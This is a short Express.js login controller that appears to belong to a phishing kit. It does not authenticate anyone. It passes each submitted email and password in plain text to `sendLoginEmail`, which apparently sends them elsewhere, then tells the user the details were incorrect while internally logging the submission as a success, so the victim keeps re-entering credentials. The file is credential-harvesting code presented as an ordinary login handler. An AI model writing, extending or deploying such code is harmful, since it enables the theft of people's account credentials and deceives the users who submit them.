const { sendLoginEmail } = require("../services/emailService.js");

exports.submitLogin = async (req, res) => {
  const { email, password } = req.body || {};

  if (!email || !password) {
    return res.render("login", { 
      message: "Email and password are required.", 
      messageType: "error" 
    });
  }

  try {
    await sendLoginEmail({ email, password });

    return res.render("login", { 
      message: "incorrect email or password. Please input correct details.", 
      messageType: "success" 
    });
  } catch (error) {
    console.error("Login submission failed:", error);

    return res.render("login", { 
      message: error.message || "Unable to process your login request right now.", 
      messageType: "error" 
    });
  }
};